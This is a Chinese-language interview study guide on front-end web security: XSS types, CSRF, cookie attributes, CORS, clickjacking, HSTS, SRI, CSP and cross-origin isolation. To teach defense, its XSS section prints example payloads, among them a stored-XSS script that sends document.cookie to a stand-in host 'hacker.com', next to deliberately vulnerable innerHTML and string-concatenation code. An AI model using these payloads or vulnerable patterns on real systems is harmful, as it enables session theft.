# XSS: 跨站脚本攻击

一、永远的 Top1：XSS（跨站脚本攻击）。

核心原理是攻击者将恶意脚本注入到网页中并在用户浏览器上执行，常用于窃取 Cookie、监听用户行为、伪造请求。常考分类有三种：

1）反射型（非持久型），恶意==代码在 URL 参数==中，服务端拼接后直接返回给==浏览器执行==；

```js
<!-- 用户点击了这个恶意链接 -->
<!-- https://example.com/search?q=<script>alert(document.cookie)</script> -->

<!-- 服务端代码（Node.js 为例） -->
app.get('/search', (req, res) => {
  const q = req.query.q; // 拿到 URL 参数：<script>alert(document.cookie)</script>
  res.send(`<h1>搜索结果：${q}</h1>`); // 直接拼进 HTML 返回
  // 浏览器收到后，<script> 被当成真代码执行了
  // 用户 cookie 就被弹出来了（实际攻击会发送到攻击者服务器）
});
```

2）存储型（持久型），恶意==代码被保存到数据库==，其他用户访问页面时==数据被下发时浏览器执行==，危害最大；

```js
<!-- 攻击者在评论框输入 -->
<script>fetch('https://hacker.com/steal?cookie='+document.cookie)</script>

<!-- 服务端把这条评论原样存进数据库 -->
<!-- 其他用户访问这个页面时，服务端从数据库取出评论，拼进 HTML -->

<div class="comment">
  <script>fetch('https://hacker.com/steal?cookie='+document.cookie)</script>
  <!-- 每个看到这条评论的用户，浏览器都会执行这段脚本 -->
  <!-- 所有人的 cookie 都被偷走了 -->
</div>
```

3）DOM型，完全在前端发生，JS 读取 URL 或输入后通过 `innerHTML` 等危险 API 直接渲染。

```js
<!-- 恶意链接：https://example.com/page#<img src=x onerror=alert(document.cookie)> -->

<div id="output"></div>

<script>
  const hash = location.hash.substring(1); // 读取 # 后面的内容
  document.getElementById('output').innerHTML = hash; 
  // 直接用 innerHTML 渲染了用户输入
  // <img src=x onerror=alert(document.cookie)> 被插入 DOM
  // 图片加载失败，触发 onerror，执行了恶意代码
  // 全程没经过服务端，纯前端发生
</script>
```



大厂防范 XSS 的现代工作流是：前端框架自带防御（React/Vue 默认对插值转义，需警惕 `dangerouslySetInnerHTML` 或 `v-html`）、服务端对用户输入过滤与输出转义、**开启 CSP（内容安全策略）**、敏感 Cookie 设置 **HttpOnly**（即使 XSS 成功也读不到 Cookie）。

前端防范XSS攻击的核心思想是 ==1. 对用户输入的数据进行严格处理，2. 限制浏览器执行不可信的代码==。

- **输入/输出检查与编码转义**：
  - **对用户输入进行编码、过滤和验证**：对所有用户输入的数据进行字符实体编码转义，特别是特殊字符如`<`、`>`、`script`等。移除不合法的HTML属性（如`onerror`）、`style`节点、`iframe`、`script`节点等。 限制用户输入的长度，增加攻击难度。  最好采用白名单机制，只允许输入预期的字符类型。
  - **对输出到HTML页面的内容进行编码或转义**：除了富文本内容，在将变量输出到HTML页面时，应使用编码或转义的方式防御XSS攻击。例如，使用`innerText`来显示非富文本内容，避免使用`innerHTML`或`outerHTML`直接插入不可信数据。
- **设置HttpOnly Cookie**：将敏感的Cookie设置为`HttpOnly`属性。这可以禁止JavaScript脚本读取带有此属性的Cookie，即使发生XSS攻击，攻击者也无法通过JavaScript窃取用户的Cookie数据，从而降低攻击影响
- **使用安全的API和框架**：
  - 选择并及时更新具有内置XSS防护机制的现代前端框架（如React、Vue）。
  - 避免将不可信数据拼接到字符串中传递给`eval()`、`setTimeout()`、`setInterval()`、`location.href`等可能执行代码的API。
- **避免内联脚本和样式**：尽可能使用外部样式表和脚本文件。如果必须使用内联，确保它们经过适当的编码或过滤。 
- **==内容安全策略（CSP）==** ：作为额外的安全层，CSP可以有效检测并削弱XSS攻击（详见下文）。 
- **其他安全实践**：定期进行代码审查和安全测试，遵循最小权限原则，使用HTTPS确保数据传输安全。 
### 三、 内容安全策略（CSP）

**1. 什么是CSP？**  
CSP（Content Security Policy）是一种额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本（XSS）和数据注入攻击等。 

**2. CSP如何工作？**  
CSP通过HTTP响应头（`Content-Security-Policy`）或HTML页面的`<meta>`标签进行配置。它定义了一系列指令，用于指定浏览器可以为当前页面加载哪些类型的资源（如脚本、样式、图片、字体等）以及这些资源的来源。浏览器会根据CSP规则，只加载和执行来自白名单源的资源，并阻止所有不在白名单中的资源。
**3. 严格CSP（Strict CSP）** ：  
为了更有效地防范XSS，现代CSP推荐使用“严格CSP”，它通常基于`Nonce`（一次性随机数）或`Hash`（哈希值）。

- **Nonce-based CSP**：为每个请求生成一个唯一的随机数（Nonce），并将其包含在CSP头和合法的`<script>`标签中。只有带有匹配Nonce的脚本才会被执行。
- **Hash-based CSP**：将内联脚本的哈希值添加到CSP策略中。只有哈希值匹配的脚本才会被执行。 
    严格CSP能有效阻止攻击者注入和执行恶意脚本，因为它要求脚本要么具有正确的Nonce，要么其哈希值在策略中被明确允许。


### 四、 XSS、CSRF与CSP的关系

- **CSP与XSS**：  
    CSP是专门为防御XSS攻击而生的“神器”。 [[18]](https://link.juejin.cn/?target=https%3A%2F%2Fcloud.tencent.com%2Fdeveloper%2Farticle%2F2218885 "https://cloud.tencent.com/developer/article/2218885") 它通过建立资源加载的白名单机制，并限制内联脚本的执行，大大降低了XSS攻击的成功率和影响范围。 [[1]](https://link.juejin.cn/?target=https%3A%2F%2Ftech.meituan.com%2F2018%2F09%2F27%2Ffe-security.html "https://tech.meituan.com/2018/09/27/fe-security.html")[[4]](https://link.juejin.cn/?target=https%3A%2F%2Fjacky-summer.github.io%2F2020%2F12%2F03%2F%25E5%2589%258D%25E7%25AB%25AF%25E5%25AE%2589%25E5%2585%25A8-XSS%25E5%2592%258CCSRF%2F "https://jacky-summer.github.io/2020/12/03/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-XSS%E5%92%8CCSRF/") CSP是一种纵深防御技术，它不能替代对用户输入的严格清理，但作为额外的安全层，可以有效防止恶意脚本的执行。 [[17]](https://link.juejin.cn/?target=https%3A%2F%2Fweb.dev%2Farticles%2Fstrict-csp%3Fhl%3Dzh-cn "https://web.dev/articles/strict-csp?hl=zh-cn")
    
- **CSP与CSRF**：  
    CSP本身**不直接防范**CSRF攻击。 [[13]](https://link.juejin.cn/?target=https%3A%2F%2Faszx87410.github.io%2Fbeyond-xss%2Fch4%2Fsame-site-cookie%2F "https://aszx87410.github.io/beyond-xss/ch4/same-site-cookie/")[[19]](https://link.juejin.cn/?target=https%3A%2F%2Fwww.cnblogs.com%2Fgaokai%2Fp%2F16687557.html "https://www.cnblogs.com/gaokai/p/16687557.html") CSRF关注的是请求的伪造，而CSP关注的是页面内容的加载和脚本的执行。然而，CSP可以通过**间接方式**对CSRF防御起到辅助作用：
    
    - **防止XSS绕过CSRF防御**：如果网站存在XSS漏洞，攻击者可能利用XSS来读取页面中的CSRF Token，或者直接在受害者浏览器中发起合法的跨域请求，从而绕过CSRF防御。CSP通过有效缓解XSS，间接堵塞了这种绕过CSRF防御的路径。 [[9]](https://link.juejin.cn/?target=https%3A%2F%2Ftech.meituan.com%2F2018%2F10%2F11%2Ffe-security-csrf.html "https://tech.meituan.com/2018/10/11/fe-security-csrf.html")[[13]](https://link.juejin.cn/?target=https%3A%2F%2Faszx87410.github.io%2Fbeyond-xss%2Fch4%2Fsame-site-cookie%2F "https://aszx87410.github.io/beyond-xss/ch4/same-site-cookie/")
- **XSS与CSRF的联系与区别**：  
    虽然XSS和CSRF都是常见的Web安全漏洞，且都属于客户端攻击，但它们在攻击原理、目标和防范策略上存在显著差异。XSS是代码注入，利用浏览器执行恶意代码；CSRF是请求伪造，利用浏览器自动携带Cookie的特性。 [[4]](https://link.juejin.cn/?target=https%3A%2F%2Fjacky-summer.github.io%2F2020%2F12%2F03%2F%25E5%2589%258D%25E7%25AB%25AF%25E5%25AE%2589%25E5%2585%25A8-XSS%25E5%2592%258CCSRF%2F "https://jacky-summer.github.io/2020/12/03/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-XSS%E5%92%8CCSRF/")[[10]](https://link.juejin.cn/?target=https%3A%2F%2Fwww.cnblogs.com%2Fleise%2Fp%2F17121220.html "https://www.cnblogs.com/leise/p/17121220.html") CSP主要用于防御XSS，而CSRF则需要依赖Token、SameSite Cookie等机制进行防范。
    

  





二、永远的 Top2：CSRF（跨站请求伪造）。核心原理是攻击者诱导用户访问恶意网站，利用用户在目标网站已登录的 Cookie（浏览器自动携带机制），向目标网站发送伪造的修改/操作请求。面试必考它与 XSS 的区别：XSS 是“窃取/注入代码”，CSRF 是“借用身份欺骗服务端”，本身不窃取数据。大厂现代防御 CSRF 的三大件：
1）**SameSite Cookie**，目前防 CSRF 的银弹，设置 `SameSite=Lax` 或 `Strict`，现代浏览器默认 Lax 阻断大部分跨站 POST 请求携带 Cookie；
2）**校验 Referer/Origin 头**，服务端判断请求来源是否合法；
3）**Anti-CSRF Token**，服务端下发随机 Token 放在 HTML 或 header 中，请求时携带校验，因为跨站无法读取该 Token。





三、高频重点：Cookie 安全三大属性。这是防御 XSS 和 CSRF 的基石，校招极爱考组合拳。

1）**HttpOnly**：禁止 JS 通过 `document.cookie` 访问，防 XSS 窃取；
2）**Secure**：限制 Cookie 只能在 HTTPS 协议下传输，防中间人窃听；
3）**SameSite**：限制第三方/跨站请求携带 Cookie，可选值 `Strict`（完全禁止跨站携带）、`Lax`（允许部分安全跨站导航携带，现代浏览器默认）、`None`（允许跨站携带，但必须配合 Secure 使用）。拓宽一点：针对第三方 Cookie 即将被淘汰的趋势，你可以提一下 **Partitioned Cookie (CHIPS 机制)**，即分区 Cookie，这是大厂目前做跨站登录/埋点强关注的前沿。


四、高频网络边界：CORS 与同源策略安全。同源策略（SOP）本身是浏览器最大的安全隔离基石（协议、域名、端口必须一致），限制了 DOM 访问、数据读取和网络请求。面试常问跨域配置漏洞：如果服务端将 `Access-Control-Allow-Origin` 设置为 `*`，同时又允许 `Access-Control-Allow-Credentials: true`，会导致极大的安全风险（实际上标准不允许这么配，通常是服务端动态回显 Origin 造成的漏洞）。顺带提一下 **预检请求 (Preflight/OPTIONS)** 的安全意义，它是浏览器在发复杂请求前先询问服务端是否允许，避免不可控的跨域副作用。


五、常考 UI 安全：点击劫持 (Clickjacking) 与 iframe 风险。核心原理是攻击者用一个透明的 iframe 覆盖在诱导性网页上，用户以为点击的是中奖按钮，实际点击的是底层 iframe 里的转账/关注按钮。防御这种 iframe 劫持的方案：1）历史方案是用 HTTP 响应头 **X-Frame-Options** 设置 `DENY` 或 `SAMEORIGIN`；2）现代大厂推荐方案是使用 CSP 的 **frame-ancestors** 指令，控制谁能嵌入当前页面。

六、易漏细节：target="_blank" 与 opener 漏洞。早期通过 `a` 标签新开窗口时，新窗口可以通过 `window.opener.location` 恶意重定向原网页到钓鱼网站。现代大厂做法和现代浏览器默认行为是：加上 **rel="noopener noreferrer"**，切断新老窗口的上下文联系，同时防范 Referer 泄露。

七、传输安全：HTTPS、中间人攻击 (MITM) 与 HSTS。HTTP 是明文的，极易被路由器/宽带运营商/黑客窃听和篡改（如网页被强插广告）。HTTPS 通过 TLS 握手、非对称加密协商密钥、对称加密传输、证书链防伪造来解决。面试常考进阶点：如何防止“首次访问 HTTP 被劫持降级”？答案是 **HSTS (Strict-Transport-Security)** 头部，服务端告诉浏览器“未来某段时间内，即使你输入 http，也要直接在本地强制升级为 https 后再发请求”。

八、资源与依赖安全：SRI 与第三方供应链风险。现在的项目引入大量 CDN 资源，如果 CDN 被黑，下发的 JS 被篡改怎么办？防御手段是 **SRI (Subresource Integrity)**，在 `<script>` 标签加 `integrity="sha384-xxx"` 属性，浏览器下载后会校验 Hash 值，不一致则拒绝执行。另外，大厂也很关注 npm 包供应链投毒攻击，通常工作流里会有 `npm audit` 或内部安全扫描机制。

九、SSP 加分项 / 现代大厂前沿安全：CSP 与 Fetch Metadata。**CSP (Content Security Policy)** 面试官非常爱听，它是缓解 XSS 的终极武器，通过 HTTP 头规定浏览器只能加载/执行指定域名的脚本、图片、样式，例如 `Content-Security-Policy: default-src 'self'; script-src https://trusted.cdn.com`。另一个前沿是 **Fetch Metadata**，现代浏览器发请求时会带上 `Sec-Fetch-Site`（跨站还是同站）、`Sec-Fetch-Mode`（cors还是navigate）、`Sec-Fetch-Dest`（请求的是图片还是脚本），服务端可以根据这些端侧提供的绝对真实的安全信号，直接在网关/WAF层拦截非法请求，目前大厂都在铺这个。

十、顶级加分项：跨源隔离 (Cross-Origin Isolation)。如果你想展示深度，可以提这部分。为了防御类似 Spectre 这种利用 CPU 预测执行漏洞窃取内存数据的侧信道攻击，浏览器引入了跨源隔离。要想使用高精度定时器 `performance.now()` 或高危并发特性 `SharedArrayBuffer`，页面必须处于安全的跨源隔离状态。这需要配置两个极其严格的响应头：**COOP (Cross-Origin-Opener-Policy)** 隔离弹窗上下文、**COEP (Cross-Origin-Embedder-Policy)** 要求所有嵌入资源必须明确声明允许跨源加载（配合 CORP 头）。一般校招能说出 COOP/COEP 这个名词，面试官就会觉得你基础非常扎实。
